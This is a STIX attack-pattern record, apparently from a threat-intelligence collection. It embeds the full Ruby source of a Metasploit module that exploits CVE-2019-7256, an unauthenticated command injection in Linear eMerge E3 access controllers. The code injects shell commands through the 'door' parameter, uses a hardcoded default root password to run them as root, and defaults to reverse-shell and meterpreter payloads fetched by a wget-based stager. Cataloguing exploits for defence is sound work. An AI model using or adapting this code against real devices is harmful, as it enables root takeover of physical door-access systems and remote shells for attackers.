{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--38499f85-e2c6-424b-bd3b-5c240f0c2788",
    "created": "2024-08-14T17:02:22.630265Z",
    "modified": "2024-08-14T17:02:22.630269Z",
    "name": "Linear eMerge E3-Series Access Controller Command Injection",
    "description": " This module exploits a command injection vulnerability in the Linear eMerge E3-Series Access Controller. The Linear eMerge E3 versions `1.00-06` and below are vulnerable to unauthenticated command injection in card_scan_decoder.php via the  `No` and `door` HTTP GET parameter. Successful exploitation results in command execution as the `root` user.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/linear_emerge_unauth_rce_cve_2019_7256.rb",
            "external_id": "linear_emerge_unauth_rce_cve_2019_7256.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-7256"
        },
        {
            "source_name": "reference",
            "url": "https://applied-risk.com/resources/ar-2019-005"
        },
        {
            "source_name": "reference",
            "url": "https://na.niceforyou.com/"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/8WUJkci8N4/cve-2019-7256"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rex/stopwatch'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Linear eMerge E3-Series Access Controller Command Injection',\n        'Description' => %q{\n          This module exploits a command injection vulnerability in the Linear eMerge\n          E3-Series Access Controller. The Linear eMerge E3 versions `1.00-06` and below are vulnerable\n          to unauthenticated command injection in card_scan_decoder.php via the  `No` and `door` HTTP GET parameter.\n          Successful exploitation results in command execution as the `root` user.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Gjoko Krstic <gjoko[at]applied-risk.com>', # Discovery\n          'h00die-gr3y <h00die.gr3y[at]gmail.com>' # MSF Module contributor\n        ],\n        'References' => [\n          [ 'CVE', '2019-7256'],\n          [ 'URL', 'https://applied-risk.com/resources/ar-2019-005' ],\n          [ 'URL', 'https://na.niceforyou.com/' ],\n          [ 'URL', 'https://attackerkb.com/topics/8WUJkci8N4/cve-2019-7256' ],\n          [ 'EDB', '47649'],\n          [ 'PACKETSTORM', '155256']\n        ],\n        'DisclosureDate' => '2019-10-29',\n        'Platform' => ['unix', 'linux'],\n        'Arch' => [ARCH_CMD, ARCH_ARMLE],\n        'Privileged' => true,\n        'Targets' => [\n          [\n            'Unix Command',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/unix/reverse_bash'\n              }\n            }\n          ],\n          [\n            'Linux Dropper',\n            {\n              'Platform' => 'linux',\n              'Arch' => [ARCH_ARMLE],\n              'Type' => :linux_dropper,\n              'CmdStagerFlavor' => [ 'wget', 'printf', 'echo' ],\n              'DefaultOptions' => {\n                'PAYLOAD' => 'linux/armle/meterpreter_reverse_tcp'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 80,\n          'SSL' => false\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options(\n      [\n        OptString.new('ROOT_PASSWORD', [ true, 'default root password on a vulnerable Linear eMerge E3-Series access controller', 'davestyle']),\n      ]\n    )\n  end\n\n  def execute_command(cmd, _opts = {})\n    random_no = rand(30..100)\n    return send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'card_scan_decoder.php'),\n      'vars_get' =>\n        {\n          'No' => random_no,\n          'door' => \"`echo #{datastore['ROOT_PASSWORD']}|su -c \\\"#{cmd}\\\"`\"\n        }\n    })\n  rescue StandardError => e\n    elog(\"#{peer} - Communication error occurred: #{e.message}\", error: e)\n    fail_with(Failure::Unknown, \"Communication error occurred: #{e.message}\")\n  end\n\n  # Checking if the target is vulnerable by executing a randomized sleep to test the remote code execution\n  def check\n    print_status(\"Checking if #{peer} can be exploited.\")\n    sleep_time = rand(2..10)\n    print_status(\"Performing command injection test issuing a sleep command of #{sleep_time} seconds.\")\n    res, elapsed_time = Rex::Stopwatch.elapsed_time do\n      execute_command(\"sleep #{sleep_time}\")\n    end\n\n    return CheckCode::Unknown('No response received from the target!') unless res\n    return CheckCode::Safe('Target is not affected by this vulnerability.') unless res.code == 200 && !res.body.blank? && res.body =~ /\"card_format_default\":\"/\n\n    print_status(\"Elapsed time: #{elapsed_time.round(2)} seconds.\")\n    return CheckCode::Safe('Command injection test failed.') unless elapsed_time >= sleep_time\n\n    CheckCode::Vulnerable('Successfully tested command injection.')\n  end\n\n  def exploit\n    case target['Type']\n    when :unix_cmd\n      print_status(\"Executing #{target.name} with #{payload.encoded}\")\n      # Don't check the response here since the server won't respond\n      # if the payload is successfully executed.\n      execute_command(payload.encoded)\n    when :linux_dropper\n      print_status(\"Executing #{target.name}\")\n      execute_cmdstager(linemax: 262144)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-10-29",
    "x_mitre_platforms": [
        "linux'"
    ]
}